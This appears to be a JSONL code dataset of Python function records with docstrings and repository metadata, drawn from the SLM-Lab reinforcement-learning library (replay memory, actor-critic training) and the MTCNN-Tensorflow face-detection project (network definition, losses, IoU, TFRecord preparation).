{"docstring": "'''Implementation for update() to add experience to memory, expanding the memory size if necessary'''\n# Move head pointer. Wrap around if necessary\n", "func_signal": "def add_experience(self, state, action, reward, next_state, done):\n", "code": "self.head = (self.head + 1) % self.max_size\nself.states[self.head] = state.astype(np.float16)\nself.actions[self.head] = action\nself.rewards[self.head] = reward\nself.ns_buffer.append(next_state.astype(np.float16))\nself.dones[self.head] = done\n# Actually occupied size of memory\nif self.size < self.max_size:\n    self.size += 1\nself.seen_size += 1\n# set to_train using memory counters head, seen_size instead of tick since clock will step by num_envs when on venv; to_train will be set to 0 after training step\nalgorithm = self.body.agent.algorithm\nalgorithm.to_train = algorithm.to_train or (self.seen_size > algorithm.training_start_step and self.head % algorithm.training_frequency == 0)", "path": "SLM-Lab/slm_lab/agent/memory/replay.py", "commit_date": "2019-05-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Train actor critic by computing the loss in batch efficiently'''\n", "func_signal": "def train(self):\n", "code": "clock = self.body.env.clock\nif self.to_train == 1:\n    batch = self.sample()\n    clock.set_batch_size(len(batch))\n    pdparams, v_preds = self.calc_pdparam_v(batch)\n    advs, v_targets = self.calc_advs_v_targets(batch, v_preds)\n    policy_loss = self.calc_policy_loss(batch, pdparams, advs)  # from actor\n    val_loss = self.calc_val_loss(v_preds, v_targets)  # from critic\n    if self.shared:  # shared network\n        loss = policy_loss + val_loss\n        self.net.train_step(loss, self.optim, self.lr_scheduler, clock=clock, global_net=self.global_net)\n    else:\n        self.net.train_step(policy_loss, self.optim, self.lr_scheduler, clock=clock, global_net=self.global_net)\n        self.critic_net.train_step(val_loss, self.critic_optim, self.critic_lr_scheduler, clock=clock, global_net=self.global_critic_net)\n        loss = policy_loss + val_loss\n    # reset\n    self.to_train = 0\n    logger.debug(f'Trained {self.name} at epi: {clock.epi}, frame: {clock.frame}, t: {clock.t}, total_reward so far: {self.body.env.total_reward}, loss: {loss:g}')\n    return loss.item()\nelse:\n    return np.nan", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Interface method to update memory'''\n", "func_signal": "def update(self, state, action, reward, next_state, done):\n", "code": "if self.body.env.is_venv:\n    for sarsd in zip(state, action, reward, next_state, done):\n        self.add_experience(*sarsd)\nelse:\n    self.add_experience(state, action, reward, next_state, done)", "path": "SLM-Lab/slm_lab/agent/memory/replay.py", "commit_date": "2019-05-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Initializes the memory arrays, size and head pointer'''\n# set self.states, self.actions, ...\n", "func_signal": "def reset(self):\n", "code": "for k in self.data_keys:\n    if k != 'next_states':  # reuse self.states\n        # list add/sample is over 10x faster than np, also simpler to handle\n        setattr(self, k, [None] * self.max_size)\nself.size = 0\nself.head = -1\nself.ns_buffer.clear()", "path": "SLM-Lab/slm_lab/agent/memory/replay.py", "commit_date": "2019-05-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''Tests that memory sets agent training flag correctly'''\n", "func_signal": "def test_batch_size(self, test_on_policy_batch_memory):\n", "code": "memory = test_on_policy_batch_memory[0]\nmemory.reset()\nmemory.body.agent.algorithm.to_train = 0\nbatch_size = test_on_policy_batch_memory[1]\nexperiences = test_on_policy_batch_memory[2]\nsize = len(experiences)\nfor i, e in enumerate(experiences):\n    if i == batch_size:\n        break\n    else:\n        memory.add_experience(*e)\nassert memory.body.agent.algorithm.to_train == 1", "path": "SLM-Lab/test/agent/memory/test_onpolicy_memory.py", "commit_date": "2019-04-21 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "'''\nInitialize the neural networks used to learn the actor and critic from the spec\nBelow we automatically select an appropriate net based on two different conditions\n1. If the action space is discrete or continuous action\n    - Networks for continuous action spaces have two heads and return two values, the first is a tensor containing the mean of the action policy, the second is a tensor containing the std deviation of the action policy. The distribution is assumed to be a Gaussian (Normal) distribution.\n    - Networks for discrete action spaces have a single head and return the logits for a categorical probability distribution over the discrete actions\n2. If the actor and critic are separate or share weights\n    - If the networks share weights then the single network returns a list.\n    - Continuous action spaces: The return list contains 3 elements: The first element contains the mean output for the actor (policy), the second element the std dev of the policy, and the third element is the state-value estimated by the network.\n    - Discrete action spaces: The return list contains 2 element. The first element is a tensor containing the logits for a categorical probability distribution over the actions. The second element contains the state-value estimated by the network.\n3. If the network type is feedforward, convolutional, or recurrent\n    - Feedforward and convolutional networks take a single state as input and require an OnPolicyReplay or OnPolicyBatchReplay memory\n    - Recurrent networks take n states as input and require env spec \"frame_op\": \"concat\", \"frame_op_len\": seq_len\n'''\n", "func_signal": "def init_nets(self, global_nets=None):\n", "code": "assert 'shared' in self.net_spec, 'Specify \"shared\" for ActorCritic network in net_spec'\nself.shared = self.net_spec['shared']\n\n# create actor/critic specific specs\nactor_net_spec = self.net_spec.copy()\ncritic_net_spec = self.net_spec.copy()\nfor k in self.net_spec:\n    if 'actor_' in k:\n        actor_net_spec[k.replace('actor_', '')] = actor_net_spec.pop(k)\n        critic_net_spec.pop(k)\n    if 'critic_' in k:\n        critic_net_spec[k.replace('critic_', '')] = critic_net_spec.pop(k)\n        actor_net_spec.pop(k)\nif critic_net_spec['use_same_optim']:\n    critic_net_spec = actor_net_spec\n\nin_dim = self.body.state_dim\nout_dim = net_util.get_out_dim(self.body, add_critic=self.shared)\n# main actor network, may contain out_dim self.shared == True\nNetClass = getattr(net, actor_net_spec['type'])\nself.net = NetClass(actor_net_spec, in_dim, out_dim)\nself.net_names = ['net']\nif not self.shared:  # add separate network for critic\n    critic_out_dim = 1\n    CriticNetClass = getattr(net, critic_net_spec['type'])\n    self.critic_net = CriticNetClass(critic_net_spec, in_dim, critic_out_dim)\n    self.net_names.append('critic_net')\n# init net optimizer and its lr scheduler\nself.optim = net_util.get_optim(self.net, self.net.optim_spec)\nself.lr_scheduler = net_util.get_lr_scheduler(self.optim, self.net.lr_scheduler_spec)\nif not self.shared:\n    self.critic_optim = net_util.get_optim(self.critic_net, self.critic_net.optim_spec)\n    self.critic_lr_scheduler = net_util.get_lr_scheduler(self.critic_optim, self.critic_net.lr_scheduler_spec)\nnet_util.set_global_nets(self, global_nets)\nself.end_init_nets()", "path": "SLM-Lab/slm_lab/agent/algorithm/actor_critic.py", "commit_date": "2020-04-14 00:00:00", "repo_name": "kengz/SLM-Lab", "stars": 1203, "license": "mit", "language": "python", "size": 4278}
{"docstring": "\"\"\"\ntrain PNet\n:param dataset_dir: tfrecord path\n:param prefix:\n:param end_epoch:\n:param display:\n:param lr:\n:return:\n\"\"\"\n", "func_signal": "def train_RNet(base_dir, prefix, end_epoch, display, lr):\n", "code": "net_factory = R_Net\ntrain(net_factory, prefix, end_epoch, base_dir, display=display, base_lr=lr)", "path": "MTCNN-Tensorflow/train_models/train_RNet.py", "commit_date": "2018-08-20 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Make a directory to store all caches\n\nParameters:\n----------\nReturns:\n-------\ncache_path: str\n    directory to store caches\n\"\"\"\n", "func_signal": "def cache_path(self):\n", "code": "cache_path = os.path.join(self.root_path, 'cache')\nif not os.path.exists(cache_path):\n    os.mkdir(cache_path)\nreturn cache_path", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "#define common param\n", "func_signal": "def P_Net(inputs,label=None,bbox_target=None,landmark_target=None,training=True):\n", "code": "with slim.arg_scope([slim.conv2d],\n                    activation_fn=prelu,\n                    weights_initializer=slim.xavier_initializer(),\n                    biases_initializer=tf.zeros_initializer(),\n                    weights_regularizer=slim.l2_regularizer(0.0005), \n                    padding='valid'):\n    print(inputs.get_shape())\n\n\n    net = slim.conv2d(inputs, 10, 3, stride=1,scope='conv1')\n    _activation_summary(net)\n    print(net.get_shape())\n    net = slim.max_pool2d(net, kernel_size=[2,2], stride=2, scope='pool1', padding='SAME')\n    _activation_summary(net)\n    print(net.get_shape())\n    net = slim.conv2d(net,num_outputs=16,kernel_size=[3,3],stride=1,scope='conv2')\n    _activation_summary(net)\n    print(net.get_shape())\n    #\n    net = slim.conv2d(net,num_outputs=32,kernel_size=[3,3],stride=1,scope='conv3')\n    _activation_summary(net)\n    print(net.get_shape())\n    #batch*H*W*2\n    conv4_1 = slim.conv2d(net,num_outputs=2,kernel_size=[1,1],stride=1,scope='conv4_1',activation_fn=tf.nn.softmax)\n    _activation_summary(conv4_1)\n    #conv4_1 = slim.conv2d(net,num_outputs=1,kernel_size=[1,1],stride=1,scope='conv4_1',activation_fn=tf.nn.sigmoid)\n    \n    print (conv4_1.get_shape())\n    #batch*H*W*4\n    bbox_pred = slim.conv2d(net,num_outputs=4,kernel_size=[1,1],stride=1,scope='conv4_2',activation_fn=None)\n    _activation_summary(bbox_pred)\n    print (bbox_pred.get_shape())\n    #batch*H*W*10\n    landmark_pred = slim.conv2d(net,num_outputs=10,kernel_size=[1,1],stride=1,scope='conv4_3',activation_fn=None)\n    _activation_summary(landmark_pred)\n    print (landmark_pred.get_shape())\n\n\n    # add projectors for visualization\n\n\n\n\n\n    #cls_prob_original = conv4_1 \n    #bbox_pred_original = bbox_pred\n    if training:\n        #batch*2\n        # calculate classification loss\n        cls_prob = tf.squeeze(conv4_1,[1,2],name='cls_prob')\n        cls_loss = cls_ohem(cls_prob,label)\n        #batch\n        # cal bounding box error, squared sum error\n        bbox_pred = tf.squeeze(bbox_pred,[1,2],name='bbox_pred')\n        bbox_loss = bbox_ohem(bbox_pred,bbox_target,label)\n        #batch*10\n        landmark_pred = tf.squeeze(landmark_pred,[1,2],name=\"landmark_pred\")\n        landmark_loss = landmark_ohem(landmark_pred,landmark_target,label)\n\n        accuracy = cal_accuracy(cls_prob,label)\n        L2_loss = tf.add_n(slim.losses.get_regularization_losses())\n        return cls_loss,bbox_loss,landmark_loss,L2_loss,accuracy\n    #test\n    else:\n        #when test,batch_size = 1\n        cls_pro_test = tf.squeeze(conv4_1, axis=0)\n        bbox_pred_test = tf.squeeze(bbox_pred,axis=0)\n        landmark_pred_test = tf.squeeze(landmark_pred,axis=0)\n        return cls_pro_test,bbox_pred_test,landmark_pred_test", "path": "MTCNN-Tensorflow/train_models/mtcnn_model.py", "commit_date": "2018-08-20 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "'''\n\n:param cls_prob:\n:param label:\n:return:calculate classification accuracy for pos and neg examples only\n'''\n# get the index of maximum value along axis one from cls_prob\n# 0 for negative 1 for positive\n", "func_signal": "def cal_accuracy(cls_prob,label):\n", "code": "pred = tf.argmax(cls_prob,axis=1)\nlabel_int = tf.cast(label,tf.int64)\n# return the index of pos and neg examples\ncond = tf.where(tf.greater_equal(label_int,0))\npicked = tf.squeeze(cond)\n# gather the label of pos and neg examples\nlabel_picked = tf.gather(label_int,picked)\npred_picked = tf.gather(pred,picked)\n#calculate the mean value of a vector contains 1 and 0, 1 for correct classification, 0 for incorrect\n# ACC = (TP+FP)/total population\naccuracy_op = tf.reduce_mean(tf.cast(tf.equal(label_picked,pred_picked),tf.float32))\nreturn accuracy_op", "path": "MTCNN-Tensorflow/train_models/mtcnn_model.py", "commit_date": "2018-08-20 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Runs the conversion operation.\n\nArgs:\n  dataset_dir: The dataset directory where the dataset is stored.\n  output_dir: Output directory.\n\"\"\"\n\n#tfrecord name \n", "func_signal": "def run(dataset_dir, net, output_dir, name='MTCNN', shuffling=False):\n", "code": "tf_filename = _get_output_filename(output_dir, name, net)\nif tf.gfile.Exists(tf_filename):\n    print('Dataset files already exist. Exiting without re-creating them.')\n    return\n# GET Dataset, and shuffling.\ndataset = get_dataset(dataset_dir, net=net)\n# filenames = dataset['filename']\nif shuffling:\n    tf_filename = tf_filename + '_shuffle'\n    #andom.seed(12345454)\n    random.shuffle(dataset)\n# Process dataset files.\n# write the data to tfrecord\nprint('lala')\nwith tf.python_io.TFRecordWriter(tf_filename) as tfrecord_writer:\n    for i, image_example in enumerate(dataset):\n        if( i%100 == 0):\n            sys.stdout.write('\\r>> Converting image %d/%d' % (i + 1, len(dataset)))\n            sys.stdout.flush()\n        filename = image_example['filename']\n        _add_to_tfrecord(filename, image_example, tfrecord_writer)\n# Finally, write the labels file:\n# labels_to_class_names = dict(zip(range(len(_CLASS_NAMES)), _CLASS_NAMES))\n# dataset_utils.write_label_file(labels_to_class_names, dataset_dir)\nprint('\\nFinished converting the MTCNN dataset!')", "path": "MTCNN-Tensorflow/prepare_data/gen_ONet_tfrecords.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"write results\n\nParameters:\n----------\nall_boxes: list of numpy.ndarray\n    detection results\nReturns:\n-------\n\"\"\"\n", "func_signal": "def write_results(self, all_boxes):\n", "code": "print('Writing fddb results')\n# res_folder = os.path.join(self.cache_path, 'results')\nres_folder = os.path.join('./FDDB', 'results')\nif not os.path.exists(res_folder):\n    os.makedirs(res_folder)\n\n# save results to fddb format\nfilename = os.path.join(res_folder, self.image_set + '-out.txt')\nwith open(filename, 'w') as f:\n    for im_ind, index in enumerate(self.image_set_index):\n        # print(\"index: \", index)\n        # f.write('%s\\n' % index.replace('/world/data-c7/zhangboyu/data/FDDB/', '')[:-4])\n        f.write('%s\\n' % index)\n        # print(\"index.replace[:-4]: \", index.replace('/world/data-c7/zhangboyu/data/FDDB/', '')[:-4])\n        dets = all_boxes[im_ind]\n        f.write('%d\\n' % dets.shape[0])\n        if len(dets) == 0:\n            continue\n        for k in range(dets.shape[0]):\n            f.write('{:.2f} {:.2f} {:.2f} {:.2f} {:.5f}\\n'.\n                    format(dets[k, 0], dets[k, 1], dets[k, 2] - dets[k, 0], dets[k, 3] - dets[k, 1],\n                           dets[k, 4]))", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "'''\n\n:param landmark_pred:\n:param landmark_target:\n:param label:\n:return: mean euclidean loss\n'''\n#keep label =-2  then do landmark detection\n", "func_signal": "def landmark_ohem(landmark_pred,landmark_target,label):\n", "code": "ones = tf.ones_like(label,dtype=tf.float32)\nzeros = tf.zeros_like(label,dtype=tf.float32)\nvalid_inds = tf.where(tf.equal(label,-2),ones,zeros)\nsquare_error = tf.square(landmark_pred-landmark_target)\nsquare_error = tf.reduce_sum(square_error,axis=1)\nnum_valid = tf.reduce_sum(valid_inds)\n#keep_num = tf.cast(num_valid*num_keep_radio,dtype=tf.int32)\nkeep_num = tf.cast(num_valid, dtype=tf.int32)\nsquare_error = square_error*valid_inds\n_, k_index = tf.nn.top_k(square_error, k=keep_num)\nsquare_error = tf.gather(square_error, k_index)\nreturn tf.reduce_mean(square_error)", "path": "MTCNN-Tensorflow/train_models/mtcnn_model.py", "commit_date": "2018-08-20 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Loads data from image and annotations files and add them to a TFRecord.\n\nArgs:\n  dataset_dir: Dataset directory;\n  name: Image name to add to the TFRecord;\n  tfrecord_writer: The TFRecord writer to use for writing.\n\"\"\"\n#print('---', filename)\n#imaga_data:array to string\n#height:original image's height\n#width:original image's width\n#image_example dict contains image's info\n", "func_signal": "def _add_to_tfrecord(filename, image_example, tfrecord_writer):\n", "code": "image_data, height, width = _process_image_withoutcoder(filename)\nexample = _convert_to_example_simple(image_example, image_data)\ntfrecord_writer.write(example.SerializeToString())", "path": "MTCNN-Tensorflow/prepare_data/gen_ONet_tfrecords.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Load annotations\n\nParameters:\n----------\nReturns:\n-------\nimdb: dict\n    image database with annotations\n\"\"\"\n", "func_signal": "def load_annotations(self):\n", "code": "annotation_file = os.path.join(self.data_path, 'imglists', self.image_set + '.txt')\nprint(os.path.join(self.data_path, 'imglists', self.image_set + '.txt'))\nassert os.path.exists(annotation_file), 'annotations not found at {}'.format(annotation_file)\nprint(\"\u5f00\u59cb\u8bfb\u53d6annotation\u6587\u4ef6\", annotation_file)\nwith open(annotation_file, 'r') as f:\n    annotations = f.readlines()\n\nimdb = []\nprint(self.num_images)\nfor i in range(self.num_images):\n    annotation = annotations[i].strip().split(' ')\n    index = annotation[0]\n    if (int(i) + 1) % 10000 == 0:\n        print(\"index:\", index)\n    # print(index)\n    im_path = self.image_path_from_index(index)\n    # print(\"im_path\", im_path)\n    imdb_ = dict()\n    imdb_['image'] = im_path\n    if self.mode == 'test':\n        #                gt_boxes = map(float, annotation[1:])\n        #                boxes = np.array(bbox, dtype=np.float32).reshape(-1, 4)\n        #                imdb_['gt_boxes'] = boxes\n        pass\n    else:\n        label = annotation[1]\n        imdb_['label'] = int(label)\n        imdb_['flipped'] = False\n        imdb_['bbox_target'] = np.zeros((4,))\n        if len(annotation[2:]) == 4:\n            bbox_target = annotation[2:]\n            imdb_['bbox_target'] = np.array(bbox_target).astype(float)\n\n    imdb.append(imdb_)\nreturn imdb", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Given image index, return full path\n\nParameters:\n----------\nindex: str\n    relative path of image\nReturns:\n-------\nimage_file: str\n    full path of image\n\"\"\"\n", "func_signal": "def image_path_from_index(self, index):\n", "code": "if not os.path.exists(index):\n    image_file = os.path.join(self.data_path, index)\nelse:\n    image_file = index\nif not image_file.endswith('.jpg'):\n    image_file = image_file + '.jpg'\nassert os.path.exists(image_file), 'Path does not exist: {}'.format(image_file)\nreturn image_file", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Get image index\n\nParameters:\n----------\nReturns:\n-------\nimage_set_index: str\n    relative path of image\n\"\"\"\n", "func_signal": "def load_image_set_index(self):\n", "code": "image_set_index_file = os.path.join(self.data_path, 'imglists', self.image_set + '.txt')\nprint(\"image_set_index_file\", image_set_index_file)\nassert os.path.exists(image_set_index_file), 'Path does not exist: {}'.format(image_set_index_file)\nwith open(image_set_index_file, 'r') as f:\n    image_set_index = [x.strip().split(' ')[0] for x in f.readlines()]\nreturn image_set_index", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"append flipped images to imdb\n\nParameters:\n----------\nimdb: imdb\n    image database\nReturns:\n-------\nimdb: dict\n    image database with flipped image annotations added\n\"\"\"\n", "func_signal": "def append_flipped_images(self, imdb):\n", "code": "print('append flipped images to imdb', len(imdb))\nfor i in range(len(imdb)):\n    imdb_ = imdb[i]\n    m_bbox = imdb_['bbox_target'].copy()\n    m_bbox[0], m_bbox[2] = -m_bbox[2], -m_bbox[0]\n\n    entry = {'image': imdb_['image'],\n             'label': imdb_['label'],\n             'bbox_target': m_bbox,\n             'flipped': True}\n\n    imdb.append(entry)\nself.image_set_index *= 2\nreturn imdb", "path": "MTCNN-Tensorflow/test/imdb.py", "commit_date": "2017-08-31 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"\nCaculate IoU between detect and ground truth boxes\n:param crop_box:numpy array (4, )\n:param bboxes:numpy array (n, 4):x1, y1, x2, y2\n:return:\nnumpy array, shape (n, ) Iou\n\"\"\"\n", "func_signal": "def IoU(box, bboxes):\n", "code": "box_area = (box[2] - box[0] + 1) * (box[3] - box[1] + 1)\nareas = (bboxes[:, 2] - bboxes[:, 0] + 1) * (bboxes[:, 3] - bboxes[:, 1] + 1)\nxx1 = np.maximum(box[0], bboxes[:, 0])\nyy1 = np.maximum(box[1], bboxes[:, 1])\nxx2 = np.minimum(box[2], bboxes[:, 2])\nyy2 = np.minimum(box[3], bboxes[:, 3])\n\n# compute the width and height of the bounding box\nw = np.maximum(0, xx2 - xx1 + 1)\nh = np.maximum(0, yy2 - yy1 + 1)\n\ninter = w * h\nover = inter / (box_area + areas - inter)\n\nreturn over", "path": "MTCNN-Tensorflow/prepare_data/data_utils.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "'''\n\n:param bbox_pred:\n:param bbox_target:\n:param label: class label\n:return: mean euclidean loss for all the pos and part examples\n'''\n", "func_signal": "def bbox_ohem(bbox_pred,bbox_target,label):\n", "code": "zeros_index = tf.zeros_like(label, dtype=tf.float32)\nones_index = tf.ones_like(label,dtype=tf.float32)\n# keep pos and part examples\nvalid_inds = tf.where(tf.equal(tf.abs(label), 1),ones_index,zeros_index)\n#(batch,)\n#calculate square sum\nsquare_error = tf.square(bbox_pred-bbox_target)\nsquare_error = tf.reduce_sum(square_error,axis=1)\n#keep_num scalar\nnum_valid = tf.reduce_sum(valid_inds)\n#keep_num = tf.cast(num_valid*num_keep_radio,dtype=tf.int32)\n# count the number of pos and part examples\nkeep_num = tf.cast(num_valid, dtype=tf.int32)\n#keep valid index square_error\nsquare_error = square_error*valid_inds\n# keep top k examples, k equals to the number of positive examples\n_, k_index = tf.nn.top_k(square_error, k=keep_num)\nsquare_error = tf.gather(square_error, k_index)\n\nreturn tf.reduce_mean(square_error)", "path": "MTCNN-Tensorflow/train_models/mtcnn_model.py", "commit_date": "2018-08-20 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "#item = 'imglists/PNet/train_%s_raw.txt' % net\n#item = 'imglists/PNet/train_%s_landmark.txt' % net\n", "func_signal": "def get_dataset(dir, net='PNet'):\n", "code": "item = '%s/neg_%s.txt' % (net,net)\n#print(item)\ndataset_dir = os.path.join(dir, item)\nimagelist = open(dataset_dir, 'r')\n\ndataset = []\nfor line in imagelist.readlines():\n    info = line.strip().split(' ')\n    data_example = dict()\n    bbox = dict()\n    data_example['filename'] = info[0]\n    data_example['label'] = int(info[1])\n    bbox['xmin'] = 0\n    bbox['ymin'] = 0\n    bbox['xmax'] = 0\n    bbox['ymax'] = 0\n    bbox['xlefteye'] = 0\n    bbox['ylefteye'] = 0\n    bbox['xrighteye'] = 0\n    bbox['yrighteye'] = 0\n    bbox['xnose'] = 0\n    bbox['ynose'] = 0\n    bbox['xleftmouth'] = 0\n    bbox['yleftmouth'] = 0\n    bbox['xrightmouth'] = 0\n    bbox['yrightmouth'] = 0        \n    if len(info) == 6:\n        bbox['xmin'] = float(info[2])\n        bbox['ymin'] = float(info[3])\n        bbox['xmax'] = float(info[4])\n        bbox['ymax'] = float(info[5])\n    if len(info) == 12:\n        bbox['xlefteye'] = float(info[2])\n        bbox['ylefteye'] = float(info[3])\n        bbox['xrighteye'] = float(info[4])\n        bbox['yrighteye'] = float(info[5])\n        bbox['xnose'] = float(info[6])\n        bbox['ynose'] = float(info[7])\n        bbox['xleftmouth'] = float(info[8])\n        bbox['yleftmouth'] = float(info[9])\n        bbox['xrightmouth'] = float(info[10])\n        bbox['yrightmouth'] = float(info[11])\n        \n    data_example['bbox'] = bbox\n    dataset.append(data_example)\n\nreturn dataset", "path": "MTCNN-Tensorflow/prepare_data/gen_ONet_tfrecords.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"Compute IoU between detect box and gt boxes\n\nParameters:\n----------\nbox: numpy array , shape (5, ): x1, y1, x2, y2, score\n    input box\nboxes: numpy array, shape (n, 4): x1, y1, x2, y2\n    input ground truth boxes\n\nReturns:\n-------\novr: numpy.array, shape (n, )\n    IoU\n\"\"\"\n", "func_signal": "def IoU(box, boxes):\n", "code": "box_area = (box[2] - box[0] + 1) * (box[3] - box[1] + 1)\narea = (boxes[:, 2] - boxes[:, 0] + 1) * (boxes[:, 3] - boxes[:, 1] + 1)\nxx1 = np.maximum(box[0], boxes[:, 0])\nyy1 = np.maximum(box[1], boxes[:, 1])\nxx2 = np.minimum(box[2], boxes[:, 2])\nyy2 = np.minimum(box[3], boxes[:, 3])\n # compute the width and height of the bounding box\nw = np.maximum(0, xx2 - xx1 + 1)\nh = np.maximum(0, yy2 - yy1 + 1)\ninter = w * h\novr = inter*1.0 / (box_area + area - inter)\nreturn ovr", "path": "MTCNN-Tensorflow/prepare_data/gen_landmark_aug_24.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "'''\ncreates a summary provides histogram of activations\ncreates a summary that measures the sparsity of activations\n\n:param x: Tensor\n:return:\n'''\n\n", "func_signal": "def _activation_summary(x):\n", "code": "tensor_name = x.op.name\nprint('load summary for : ',tensor_name)\ntf.summary.histogram(tensor_name + '/activations',x)\n#tf.summary.scalar(tensor_name + '/sparsity', tf.nn.zero_fraction(x))", "path": "MTCNN-Tensorflow/train_models/mtcnn_model.py", "commit_date": "2018-08-20 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"\nread label file\n:param dir: path\n:return:\n\"\"\"\n", "func_signal": "def read_annotation(base_dir, label_path):\n", "code": "data = dict()\nimages = []\nbboxes = []\nlabelfile = open(label_path, 'r')\nwhile True:\n    # image path\n    imagepath = labelfile.readline().strip('\\n')\n    if not imagepath:\n        break\n    imagepath = base_dir + '/WIDER_train/images/' + imagepath\n    images.append(imagepath)\n    # face numbers\n    nums = labelfile.readline().strip('\\n')\n    # im = cv2.imread(imagepath)\n    # h, w, c = im.shape\n    one_image_bboxes = []\n    for i in range(int(nums)):\n        # text = ''\n        # text = text + imagepath\n        bb_info = labelfile.readline().strip('\\n').split(' ')\n        # only need x, y, w, h\n        face_box = [float(bb_info[i]) for i in range(4)]\n        # text = text + ' ' + str(face_box[0] / w) + ' ' + str(face_box[1] / h)\n        xmin = face_box[0]\n        ymin = face_box[1]\n        xmax = xmin + face_box[2]\n        ymax = ymin + face_box[3]\n        # text = text + ' ' + str(xmax / w) + ' ' + str(ymax / h)\n        one_image_bboxes.append([xmin, ymin, xmax, ymax])\n        # f.write(text + '\\n')\n    bboxes.append(one_image_bboxes)\n\n\ndata['images'] = images#all images\ndata['bboxes'] = bboxes#all image bboxes\n# f.close()\nreturn data", "path": "MTCNN-Tensorflow/prepare_data/data_utils.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
{"docstring": "\"\"\"\nread label file\n:param dir: path\n:return:\n\"\"\"\n", "func_signal": "def read_and_write_annotation(base_dir, dir):\n", "code": "data = dict()\nimages = []\nbboxes = []\nlabelfile = open(dir, 'r')\nf = open('/home/thinkjoy/data/mtcnn_data/imagelists/train.txt', 'w')\nwhile True:\n    # image path\n    imagepath = labelfile.readline().strip('\\n')\n    if not imagepath:\n        break\n    imagepath = base_dir + '/WIDER_train/images/' + imagepath\n    images.append(imagepath)\n    # face numbers\n    nums = labelfile.readline().strip('\\n')\n    im = cv2.imread(imagepath)\n    h, w, c = im.shape\n    one_image_bboxes = []\n    for i in range(int(nums)):\n        text = ''\n        text = text + imagepath\n        bb_info = labelfile.readline().strip('\\n').split(' ')\n        # only need x, y, w, h\n        face_box = [float(bb_info[i]) for i in range(4)]\n        text = text + ' ' + str(face_box[0] / w) + ' ' + str(face_box[1] / h)\n        xmin = face_box[0]\n        ymin = face_box[1]\n        xmax = xmin + face_box[2] - 1\n        ymax = ymin + face_box[3] - 1\n        text = text + ' ' + str(xmax / w) + ' ' + str(ymax / h)\n        one_image_bboxes.append([xmin, ymin, xmax, ymax])\n        f.write(text + '\\n')\n    bboxes.append(one_image_bboxes)\n\n\ndata['images'] = images\ndata['bboxes'] = bboxes\nf.close()\nreturn data", "path": "MTCNN-Tensorflow/prepare_data/data_utils.py", "commit_date": "2018-08-17 00:00:00", "repo_name": "AITTSMD/MTCNN-Tensorflow", "stars": 1498, "license": "None", "language": "python", "size": 125859}
